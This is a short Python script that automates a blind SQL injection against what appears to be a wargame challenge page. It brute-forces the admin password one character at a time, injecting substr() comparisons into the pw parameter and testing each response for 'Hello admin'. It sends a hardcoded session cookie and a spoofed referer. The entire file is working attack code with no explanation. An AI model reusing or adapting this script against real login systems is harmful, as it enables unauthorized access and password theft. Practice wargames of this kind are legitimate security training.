import urllib.request
import time

table = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d', 'e', 'f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']

key = ""
payload1 = "?pw=1'%20or%20id='admin'%20and%20(substr(pw,"
payload2 = ",1)%20=%20'"
payload3 = "')%20--%20"
url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php"
coo = "PHPSESSID="+"4v4gd4lcuvee25jhvoehoq0pa2"

header = {'referer': 'http://m.naver.com', 'User-Agent': 'Mozilla/5.0', "cookie":coo}

for i in range(1,9):
     for t in table:
          payload = payload1 + str(i) + payload2 + t + payload3
          print("payload : ", payload)
          req = urllib.request.Request(url+payload, headers=header)
          res = urllib.request.urlopen(req)
          result = str(res.read())
          time.sleep(0.01)

          if result.count("Hello admin") >= 1 :
               key += t
               break

     print("key is ", key)
